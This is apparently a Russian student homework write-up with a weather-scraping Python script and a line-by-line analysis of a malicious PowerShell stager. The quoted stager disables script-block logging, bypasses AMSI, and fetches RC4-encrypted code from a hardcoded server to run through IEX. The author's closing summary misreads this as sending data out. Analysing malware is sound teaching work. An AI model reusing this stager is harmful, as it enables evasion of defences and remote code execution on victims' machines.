# Домашнее задание №27: Scripting, web, python

1) Написать python-script для автоматизации часто выполняемых действий, либо парсинга сайта для получения нужной информации  

2) Расписать действия PowerShell скрипта  
![ScriptTask](https://github.com/StsiapanSikorsky/Cybersecurity_TMScourse/blob/main/Task_27/img/ScriptTask.png)  

Ссылки на дополнительные ресурсы:  
- [Создание symbo table для кастомных ядер](https://blog.tofile.dev/2022/08/22/cloud-forensics.html)  
- [HTML5 templates](https://html5up.net/)  

## 1) Python-script для парсинга сайта погоды  

Перед началом, на сайте погоды, необходимо найти часть, которая хранит значения погоды в Минске. Через консоль разработчиа (F12) поэтапно разворачивая тэги находим нужный   
![Py_1]()  

После чего приступаем к написанию скрипта  

```python
#!/usr/bin/env python3

#импорт библиотек
from bs4 import BeautifulSoup
import requests

#адрес сайта который парсим
url = 'https://yandex.by/pogoda/minsk?lat=53.902735&lon=27.555691'

#проверка связи с сервером
response = requests.get(url)
print(response)

#получение страницы в формате lxml
bs = BeautifulSoup(response.text, "lxml")
#print(bs)

#поиск значения по тэгу и его классу
temp = bs.find('span', 'temp__value temp__value_with-unit')
print(temp.text)
```

## 2) Действия скрипта PowerShell  
``` powershell
IF ($PSVersionTABLE.PSversion.Major=ge3)  
```

- 2.1 Строка провверяет установлен ли в системее PowerShell через встроенную переменную PSVersionTable. PSVersion - свойство, которое представляет номер версии в виде объекта. =ge - оператор сравнения. В случае true, выполняются действия до описания 2.5 включительо.  

``` powershell
>$GPF=[REF].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySetings','N'+'onPublic,Static');  
```

- 2.2 Если условие было выполнено выполнение строки выше предоставляет доступ к закрытому статическому полю **cachedGroupPolicySetings** класса **System.Management.Automation.Utils**. [REF] - тип в PowerShell позволяющий работать на объекты и ссылки, которые не доступны напрямую.  

``` powershell
>if($GPF){
    $GPC=$GPF.GetValue($NULL);
    if($GPC['ScriptB'+'lockLogging'])
    {
        $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
        $GPC['ScriptB'+'lockLogging']['EnableScriptBlockinvocationLogging']=0;
    }
    $vAl=[Collections.Generic.Dictionary[string,system.object]]::new();
    $Val.Add('EnableScriptB'+'lockLogging',0);
    $VAL.Add('EnableScriptBlockinvocationLogging',0);
    $GPC[*HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'ScriptB'+'lockLogging']=$VAI
}
```

- 2.3 Фрагмент пытается изменить настройки, связанные с логгированием блока скриптов. Вложенное условие проверяет есть ли настройка ScriptBlockLogging в $GPC и если она существует отключает логгирование (установка EnableScriptBlockInvocationLogging в 0). Последняя строка используется для установки ключа реестра. 

``` powershell
else
{
    [ScriptBlock]."GetFeld"('signatures','NonPublic','Static').SetValue($Null,(New-ObjectCollections.Generic.HashSet[string]))
}
``` 

- 2.4 Блок используетя, если условие if($GPF) вернуло false. В нем код использует рефлексию для доступа к закрытому статическому полю signature в классе ScriptBlock. Метод SetValue вызывается для установленного поля, чтобы задать его значение как новый пустой HashSet<string>. Это эффективно очищает любые существующие подписи, которые PowerShell использует для идентификации подозрительной активности, что может быть полезно для уклонения от обнаружения механизмами безопасности.  

``` powershell
[REF].Assembly.GetType('System.Management.Automation.AmsiUtils') |?{$_}| 
%{
    $_.GetField('amsilnitFailed','NonPublic,Static').SetValue($NULL, $True)
}
``` 

- Команда предназначена для манипуляции статическим полем amsiInitFailed класса AmsiUtils, что позволяет обойти проверки Antimalware Scripting Interface (AMSI). Команда начинается с доступа к классу AmsiUtils в пространстве имен System.Management.Automation с использованием рефлексии. Этот класс отвечает за взаимодействие с AMSI. Часть | ?{$_} фильтрует результаты, но поскольку сразу за ней следует %{}, это фактически не имеет значительного эффекта. Оператор %{} используется для итерации по каждому элементу в конвейере. Внутри цикла метод GetField('amsiInitFailed', 'NonPublic', 'Static') извлекает закрытое статическое поле с именем amsiInitFailed. Это поле указывает, произошла ли ошибка инициализации AMSI. Метод SetValue($NULL, $True) устанавливает это поле в значение $True, что сигнализирует о том, что инициализация AMSI завершилась неудачно. Когда этот флаг установлен в true, последующие вызовы AMSI для сканирования содержимого будут игнорироваться, что фактически отключает защитные меры AMSI.

``` powershell
[System.Net.ServicePolntManager]::Expect100Continue=0;  
$WC=New-ObjectSystem.Net.Webclient;  
$u='Mozila/5.0(WindowsNT6.1; WOW64; Trident/7.0; rv:11.0) likeGecko';  
$WC.Headers.Add('User-Agent', $u);  
``` 

- В начале блока отключается заголовок "Expect:100-continue". Вторая строка создает новый объект WebClient, использующийдля отправки HTTP-запросов и получения ответов от веб-сервера. $u задает строку User-Agent, которая будет отправлена вместе с запросами. Последняя строка добавляет заголовок User-Agent к запросам, отправляемым через объект WebClient.  

``` powershell  
$WC.Proxy=[System.Net.WebRequest]::DefaltWebProxy;  
$WC.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;  
$Script:Proxy=$WC.Proxy;  
$K=[System.Text.Encoding]::ASCII.Getbytes('99754106633f94350db34d548d6091a');  
```   

- В приведенном выше блоке устанавливается и настраиваются параметры прокси для объекта WebClient. DefaultNetworkCredentials автоматически получает учетные данные текущего пользователя для аутентификации на прокси сервере. Последняя строка кодирует строку с использованием кадировки ASCII, предположительно используется для передачи данных по сети.  

``` powershell  
$R=($D, $K=$args; $S=0...255)|%
{
    $J=($J+$S[$_]+$K[$_%$L.count])%256;
    $S[$_], $S[$J], $S[$_]
};
$D|%
{
    $I=($I+1)%256;
    $H=($H+$S[$I])%256;
    $S[$I], $S[$H]=$S[$H], $S[$I];
    $_-bXOR $S[($S[$I]+$S[$H])%256]
};  
$ser="http://10.6.100.123:80";
$t='/news.php';
$WC.Headers.Add("Cookie","session=8xD4koAuu7Hah4KQzwZ/kDq4Oc=");  
$Data=$WC.DownloadData($SER+$T);
$IV=$Data[0..3];
$Data=$Data[4..$Data.lenghth];
-join[Char[]](&$R$Data($IV+$K))|IEX    
```   

- Код выполняет функцию шифрования RC4, после чего отправляют данные на указанный URL 


<[!CAUTION] Таким образом представленный на сриншоте код вредоноса, обходит защиту устройства, устанавливает прокси соединение с сервером управлния, шифрует данные при помощи алгоритма RC4 и отправляет их на сервер управления.